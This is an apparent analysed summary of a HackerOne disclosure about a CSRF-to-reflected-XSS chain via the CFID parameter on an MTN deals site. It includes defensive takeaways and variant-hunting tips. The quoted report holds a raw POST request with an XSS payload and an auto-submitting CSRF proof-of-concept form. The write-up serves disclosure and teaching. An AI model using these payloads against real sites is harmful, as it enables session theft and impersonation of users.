# Cross-Site Request Forgery (CSRF) to Stored/Reflected XSS via CFID Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 1183241 | https://hackerone.com/reports/1183241
- **Submitted:** 2021-05-03
- **Reporter:** lu3ky-13
- **Program:** MTN (dailydeals.mtn.co.za)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS) - Reflected, Insufficient Input Validation, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
The application is vulnerable to CSRF attacks that can be chained with XSS through the CFID parameter on the deals page. An attacker can craft a malicious POST request that injects arbitrary HTML/JavaScript into the CFID field, which is reflected back to users without proper sanitization. This allows attackers to execute arbitrary JavaScript in the context of the victim's browser session.

## Attack scenario
1. Attacker identifies that the /index.cfm?GO=DEALS endpoint accepts POST requests with a CFID parameter that lacks CSRF protection tokens or validation
2. Attacker crafts a malicious CFID value containing XSS payload: fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e"><img src=x onerror=alert(document.domain)>
3. Attacker hosts an HTML page containing a form that automatically submits a POST request to the vulnerable endpoint with the malicious CFID payload
4. Victim visits the attacker's malicious page while logged into dailydeals.mtn.co.za, triggering the CSRF form submission
5. The vulnerable server reflects the XSS payload back in the response without proper encoding
6. Victim's browser executes the injected JavaScript, granting attacker access to session cookies, local storage, and ability to perform actions on behalf of the victim

## Root cause
The application fails to implement CSRF protection mechanisms (such as anti-CSRF tokens) and does not properly sanitize or encode the CFID parameter before reflecting it back in HTTP responses. The ColdFusion application accepts and reflects user-supplied input without validation or output encoding.

## Attacker mindset
An attacker would recognize this as a high-impact vulnerability chain allowing account compromise without requiring separate CSRF tokens or SameSite cookie protections. The ease of exploitation via a simple HTML form makes this attractive for widespread phishing campaigns targeting logged-in users.

## Defensive takeaways
- Implement robust CSRF protection using anti-CSRF tokens (synchronized token pattern) on all state-changing operations
- Apply strict output encoding/escaping to all user-supplied input before rendering in HTML context (use context-aware encoding)
- Implement Content Security Policy (CSP) headers to prevent inline script execution and restrict script sources
- Use HTTPOnly and Secure flags on session cookies to prevent JavaScript access
- Implement SameSite cookie attribute (Strict or Lax) to prevent cross-site request cookie inclusion
- Perform input validation on all parameters, rejecting or sanitizing special HTML characters
- Use a templating engine that auto-escapes output by default
- Implement security headers such as X-Frame-Options and X-Content-Type-Options
- Conduct regular security testing including CSRF and XSS testing across all forms

## Variant hunting
Look for similar CFID, CFTOKEN, or session identifier parameters in other ColdFusion applications that may lack CSRF and XSS protections. Test other endpoints with GET/POST parameters that accept user input and check if output is properly encoded. Search for other parameters that may be reflected without encoding (category_id, cpID, location_id, m parameters should also be tested).

## MITRE ATT&CK
- T1190
- T1566
- T1204
- T1539
- T1059

## Notes
The report is relatively brief and lacks specific details about remediation. The vulnerability combines two attack vectors (CSRF + XSS) making it particularly dangerous. The use of ColdFusion's CFID/CFTOKEN session management without proper security controls is a common weakness in legacy ColdFusion applications. The attacker demonstrates good understanding by providing both the raw HTTP request and a formatted CSRF PoC.

## Full report
<details><summary>Expand</summary>

hello dear support

i have found csrf to xss on https://dailydeals.mtn.co.za/index.cfm?GO=DEALS

URL:https://dailydeals.mtn.co.za/index.cfm?GO=DEALS

URL encoded POST input CFID was set to fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e"><img src=x onerror=alert(document.domain)>

HTTP request
============
POST /index.cfm?GO=DEALS HTTP/1.1
Host: dailydeals.mtn.co.za
Cookie: EBSAuthCookie=15302|||N; TS011bbda7=014f25e894c21e6b965792d5df17dd4ba82e1424b80a3aa2fbd660ae991db17501f4bbd59e45568e30ca4fffd17a7b0b225c8e53dd; cfid=3283cef9-4136-403d-ae30-fa9a875b1da3; cftoken=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Origin: https://dailydeals.mtn.co.za
Referer: https://dailydeals.mtn.co.za/index.cfm?GO=DEALS
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

CFID=fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E&CFTOKEN=0&category_id=9&cpID=1&location_id=0&m=1


Csrf Poc
=========

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://dailydeals.mtn.co.za/index.cfm?GO=DEALS" method="POST">
      <input type="hidden" name="CFID" value="fbe8c86c&#45;c0b2&#45;4421&#45;8ca2&#45;dcfc14763d6e&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="CFTOKEN" value="0" />
      <input type="hidden" name="category&#95;id" value="9" />
      <input type="hidden" name="cpID" value="1" />
      <input type="hidden" name="location&#95;id" value="0" />
      <input type="hidden" name="m" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

## Impact

Malicious JavaScript has access to all the same objects as the rest of the web page, including access to cookies and local storage, which are often used to store session tokens. If an attacker can obtain a user's session cookie, they can then impersonate that user.

Furthermore, JavaScript can read and make arbitrary modifications to the contents of a page being displayed to a user. Therefore, XSS in conjunction with some clever social engineering opens up a lot of possibilities for an attacker

</details>

---
*Analysed by Claude on 2026-05-12*
